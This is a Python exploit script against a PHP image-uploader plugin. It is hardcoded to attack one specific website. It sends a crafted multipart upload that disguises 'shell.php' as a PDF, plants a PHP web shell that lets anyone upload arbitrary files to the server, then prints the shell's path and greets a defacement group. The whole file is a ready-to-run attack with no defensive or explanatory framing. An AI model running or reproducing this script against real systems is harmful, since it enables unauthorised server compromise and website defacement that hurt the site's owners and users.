#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import urllib3
import requests
from time import sleep

banner = """
 ┌───────────────────────────────────────────────────┐
 │         ╔═╗ ╦   ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗╦═╗          │
 │         ║   ║───║ ║╠═╝║  ║ ║╠═╣ ║║║╣ ╠╦╝          │
 │         ╚═╝╚╝   ╚═╝╩  ╩═╝╚═╝╩ ╩═╩╝╚═╝╩╚═          │
 │ File upload exploit for cj-image-uploader plugin. │
 │                                                   │
 │             Made with ❤ by @mkdirlove             │
 └───────────────────────────────────────────────────┘
"""

def main():
    os.system("clear")
    print(banner)
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    headers = {
        'Host': 'bmcadvisors.in',
        'Sec-Ch-Ua': '"-Not.A/Brand";v="8", "Chromium";v="102"',
        'Accept': '*/*',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryPDxA0WrsQaEkZWS8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Origin': 'https://bmcadvisors.in',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://bmcadvisors.in/careers.php',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    data = '------WebKitFormBoundaryPDxA0WrsQaEkZWS8\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: application/pdf\r\n\r\n<!DOCTYPE html>\r\n<html lang="en">\r\n\t<head>\r\n\t\t<meta charset="utf-8">\r\n\t\t<style>*{font-family:\'Courier New\',sans-serif;font-size:14px;color:#ff003b;background-color:black;}</style>\r\n\t</head>\r\n\t<body>\r\n\t\t<?php echo "<center>File Uploader :: mkdirlove<br>";echo "<form method=\'POST\' enctype=\'multipart/form-data\'><input type=\'file\' name=\'file2upload\'><input type=\'submit\' name=\'upload\' value=\'Upload\'></form></center>";$files = $_FILES[\'file2upload\'][\'name\'];if(isset($_POST[\'upload\'])){if(@copy($_FILES[\'file2upload\'][\'tmp_name\'], $files)){echo "<center>[+] File <b>$files</b> has been uploaded [+]</center>";}else{echo "<center>[-] Upload has failed [-]</center>";}} ?>\r\n\t</body>\r\n</html>\r\n\n\r\n------WebKitFormBoundaryPDxA0WrsQaEkZWS8--\r\n'

    response = requests.post(
        'https://bmcadvisors.in/plugins/cj-upload/php/cj-image-uploader.php?folderpath=dXBsb2FkLw==&pluginpath=cGx1Z2lucy9jai11cGxvYWQv&extension=cGhw&tagname=',
        headers=headers,
        data=data,
        verify=False,
    )
    res_data = json.loads(response.text)
    shell = res_data['data']['path']

    sleep(3)
    print(" [✔] Your shell has been uploaded!")
    print(f" [✔] Path: {headers['Origin']}/upload/{shell}\n")
    print(" [❤] Greetings to all the members of DefacerPH!\n")
            
if __name__ == '__main__':
    main()
